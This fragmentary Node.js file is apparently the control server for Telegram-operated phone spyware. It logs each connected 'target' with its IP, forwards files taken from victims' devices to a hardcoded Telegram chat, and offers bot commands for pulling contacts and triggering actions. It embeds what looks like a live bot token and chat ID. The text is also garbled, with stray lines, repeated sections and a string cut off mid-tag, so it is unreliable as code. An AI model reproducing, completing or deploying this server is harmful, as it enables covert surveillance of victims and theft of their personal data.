...
// Telegram Bot config
const chatId = '8348574306';
const token = '8265050314:AAG1oYAx6tJdV0z3tS1M_r_SpGmxvIcQD3w';
...
if (!serverAddr) {
  console.error("❌ SERVER_URL is missing. Set it in environment variables.");
}
...
app.post('/sendFile', upload.single('file'), (req, res) => {
  ...
  bot.sendDocument(chatId, file.buffer, {}, { filename: file.originalname, contentType: 'application/txt' })
...
hi
// WebSocket & UUID handling
wss.on('connection', (ws, req) => {
  ws.uuid = uuid4.v4();
  bot.sendMessage(chatId, `<b>New Target Connected 📱\n\nID => ${ws.uuid}\nIP = ${req.socket.remoteAddress}</b>`, { parse_mode: 'HTML' });
});

// Keep clients alive
setInterval(() => {
  wss.clients.forEach(client => client.send('be alive'));
}, 1000);

// Telegram commands
bot.on('message', msg => {
  if (msg.text === '/start') {
    bot.sendMessage(chatId, "<b>Welcome!</const socket = require('ws');
const http = require('http');
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
...
if (!serverAddr) {
  console.error("❌ SERVER_URL is missing. Set it in environment variables.");
  // Hakuna crash, ping itakuwa inactive
}
...
bot.on('message', msg => {
  if (msg.text === '/start') {
    bot.sendMessage(chatId, "<b>Welcome!</b>", { reply_markup: { keyboard: [['All Contact 👤'], ['Action ☄']] } });
  }
});

// Ping server periodically with Axios (safe check for empty URL)
setInterval(() => {
  if (!serverAddr) return; // hakikisha URL ipo kabla ya ku-call Axios
  axios.get(serverAddr)
    .then(() => console.log("Ping successful"))
    .catch(err => console.error("Axios ping error:", err.message));
}, 120000); // 2 minutes
